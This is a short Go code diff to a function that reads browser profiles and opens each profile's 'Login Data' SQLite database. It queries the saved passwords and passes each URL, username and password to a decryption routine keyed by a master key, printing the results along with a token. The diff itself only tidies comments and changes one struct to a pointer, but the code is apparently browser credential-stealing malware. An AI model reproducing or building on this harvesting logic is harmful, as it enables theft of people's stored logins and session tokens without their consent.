@@ -86,9 +86,7 @@ func MainBL(browser model.BrowserPaths) {
 		jsonBytes, err := json.Marshal(token)
 		jsonString := string(jsonBytes)
 		fmt.Println(jsonString)
-		//isLogin := pkg.CheckLogin(token)
 
-		// //
 		path = fmt.Sprintf("%v\\Login Data", profile)
 		connInfo, err := pkg.ConnectSQLite(path)
 		info, _ := pkg.QueryData(connInfo, pkg.Passwords)
@@ -105,8 +103,7 @@ func MainBL(browser model.BrowserPaths) {
 		fmt.Println(listInfo)
 		profiletmp := strings.Split(profile, "\\")
 		for _, value := range listInfo {
-
-			infoRow := model.Info{
+			infoRow := &model.Info{
 				Url:      value["action_url"].(string),
 				UserName: value["username_value"].(string),
 				Pass:     value["password_value"].(string),
@@ -116,9 +113,5 @@ func MainBL(browser model.BrowserPaths) {
 			result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
 			fmt.Println(result)
 		}
-
-		// //
-
 	}
-
 }
